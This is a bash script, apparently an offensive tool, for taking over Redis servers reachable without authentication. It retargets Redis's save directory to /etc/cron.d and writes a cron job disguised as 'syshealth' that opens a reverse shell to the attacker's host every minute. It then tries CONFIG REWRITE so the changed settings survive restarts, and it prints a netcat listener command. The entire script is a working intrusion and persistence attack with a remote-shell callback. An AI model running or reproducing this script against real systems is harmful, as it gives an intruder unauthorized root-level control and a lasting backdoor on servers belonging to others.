#!/bin/bash
# redis_persist.sh — Redis unauthenticated RCE → persistence
# Targets: svc-redis-01 (Redis 7.0.15), svc-database-01 (Redis 7.0.15)
# Techniques:
#   1. Cron via Redis key write to /etc/cron.d (if redis runs as root)
#   2. Redis CONFIG REWRITE to persist backdoored settings
# Usage: ./redis_persist.sh <target_ip> [redis_port] [redis_password] [lhost] [lport]

TARGET="${1:?Usage: $0 <target_ip> [redis_port] [redis_pass] [lhost] [lport]}"
RPORT="${2:-6379}"
RPASS="${3:-}"
LHOST="${4:-$(hostname -I | awk '{print $1}')}"
LPORT="${5:-4445}"

# Redis CLI wrapper — handles optional auth
rcli() {
    if [[ -n "$RPASS" ]]; then
        redis-cli -h "$TARGET" -p "$RPORT" -a "$RPASS" --no-auth-warning "$@"
    else
        redis-cli -h "$TARGET" -p "$RPORT" "$@"
    fi
}

echo "[*] === Redis Persistence Deployer ==="
echo "[*] Target : $TARGET:$RPORT"
echo ""

# ── Probe ─────────────────────────────────────────────────────────────────────
echo "[*] Probing Redis..."
PING=$(rcli PING 2>/dev/null)
if [[ "$PING" != "PONG" ]]; then
    echo "[-] Cannot reach Redis at $TARGET:$RPORT (got: $PING)"
    echo "    Try providing the correct password as \$3"
    exit 1
fi
echo "[+] Redis responds to PING"

INFO_SERVER=$(rcli INFO server 2>/dev/null)
REDIS_USER=$(echo "$INFO_SERVER" | grep -i 'config_file\|executable' | head -3)
echo "[*] Server info:"
echo "$REDIS_USER" | sed 's/^/    /'

# ── Method 1: Cron via /etc/cron.d write ─────────────────────────────────────
echo ""
echo "[*] [1/2] Cron injection via Redis RDB write..."
CRON_CONTENT=$'\n\n'"* * * * * root bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"$'\n\n'

rcli CONFIG SET dir /etc/cron.d 2>/dev/null
ACTUAL=$(rcli CONFIG GET dir 2>/dev/null | tail -1)
if [[ "$ACTUAL" == "/etc/cron.d" ]]; then
    rcli CONFIG SET dbfilename "syshealth" 2>/dev/null
    rcli SET rtcron "$CRON_CONTENT" 2>/dev/null
    rcli BGSAVE 2>/dev/null
    sleep 1
    echo "[+] Cron written to /etc/cron.d/syshealth — fires every minute"
    echo "[!] Listener: nc -lvnp $LPORT"
else
    echo "[-] Cannot write to /etc/cron.d (Redis may not run as root)"
fi

# Restore
rcli CONFIG SET dir /tmp 2>/dev/null
rcli CONFIG SET dbfilename dump.rdb 2>/dev/null

# ── Method 2: Redis CONFIG rewrite for persistence across restarts ────────────
echo ""
echo "[*] [2/2] Attempting CONFIG REWRITE to persist CONFIG changes..."
rcli CONFIG REWRITE 2>/dev/null && echo "[+] redis.conf rewritten with backdoored settings" \
    || echo "[-] CONFIG REWRITE failed (config file may be read-only)"

echo ""
echo "[*] === Summary ==="
echo "    Cron    : /etc/cron.d/syshealth  (if Redis runs as root)"
echo "    LHOST:LPORT = $LHOST:$LPORT"
